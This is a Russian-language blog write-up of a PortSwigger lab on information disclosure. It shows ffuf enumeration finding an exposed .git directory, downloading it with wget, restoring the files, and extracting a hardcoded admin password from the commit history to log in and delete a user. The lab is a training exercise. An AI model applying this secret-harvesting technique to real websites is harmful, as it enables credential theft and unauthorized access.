---
title: "Information disclosure in version control history"
date: 2025-07-10
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history"
classes: wide
---

В лабораторной работе можно получить доступ к системе контроля версий git и извлечь из нее данные для входа в учетную запись администратора.

Для решения нужно залогиниться от лица админа и удалить пользователя `carlos`.

```
https://0a3f00d5049e908f80d1448300ca0041.web-security-academy.net
```

## Solution

Осмотрю сайт. Попробую залогиниться с постоянными кредами в лабах `PortSwigger` — `wiener`:`peter`, хоть их нам и не дали. Успех ~~взломал, получается~~

![IMG](/assets/images/PortSwigger/IMG_information_disclosure/IMG_Information_disclosure_in_version_control_history/1.png){: height="200" .align-center}

Ладно, пойду запускать `ffuf`:

```bash
cu63:~/ $ ffuf -u https://0a3f00d5049e908f80d1448300ca0041.web-security-academy.net/FUZZ -w ~/wordlists/common.txt                                                                                                                                                                                                                                               [17:04:24]

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://0a3f00d5049e908f80d1448300ca0041.web-security-academy.net/FUZZ
 :: Wordlist         : FUZZ: /Users/cu63/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 236ms]
.git/config             [Status: 200, Size: 157, Words: 14, Lines: 9, Duration: 296ms]
.git/index              [Status: 200, Size: 225, Words: 2, Lines: 3, Duration: 243ms]
.git/logs/              [Status: 200, Size: 548, Words: 152, Lines: 19, Duration: 324ms]
.git                    [Status: 200, Size: 1201, Words: 256, Lines: 27, Duration: 371ms]
ADMIN                   [Status: 401, Size: 2617, Words: 1049, Lines: 54, Duration: 69ms]
Login                   [Status: 200, Size: 3192, Words: 1315, Lines: 64, Duration: 71ms]
Admin                   [Status: 401, Size: 2617, Words: 1049, Lines: 54, Duration: 81ms]
admin                   [Status: 401, Size: 2617, Words: 1049, Lines: 54, Duration: 157ms]
analytics               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 62ms]
:: Progress: [1437/4686] :: Job [1/1] :: 54 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
```

Сразу интересно) Пойду смотреть файлы `.git`:

![IMG](/assets/images/PortSwigger/IMG_information_disclosure/IMG_Information_disclosure_in_version_control_history/2.png){: height="200" .align-center}

Вот такое нашел в логах:

![IMG](/assets/images/PortSwigger/IMG_information_disclosure/IMG_Information_disclosure_in_version_control_history/3.png){: height="200" .align-center}

Скачаю директорию `.git` к себе на комп:

```bash
wget -r https://0a3f00d5049e908f80d1448300ca0041.web-security-academy.net/.git
```

Зайду в эту папку и введу следующую команду:

```bash
git restore .
```

Я смог восстановить файлы:

![IMG](/assets/images/PortSwigger/IMG_information_disclosure/IMG_Information_disclosure_in_version_control_history/4.png){: height="200" .align-center}

Попробу посмотреть логи изменений через `git show`:

![IMG](/assets/images/PortSwigger/IMG_information_disclosure/IMG_Information_disclosure_in_version_control_history/5.png){: height="200" .align-center}

Можно увидеть, что пароль `9fpnrxua13e5nx90y6kf` раньше был захардкожен, а теперь берется из `env`. Но я все равно его достал. Бегом в ЛК, пока не спалили)

![IMG](/assets/images/PortSwigger/IMG_information_disclosure/IMG_Information_disclosure_in_version_control_history/6.png){: height="200" .align-center}

Удалил пользователя, а значит лаба решена)

![IMG](/assets/images/PortSwigger/IMG_information_disclosure/IMG_Information_disclosure_in_version_control_history/7.png){: height="200" .align-center}
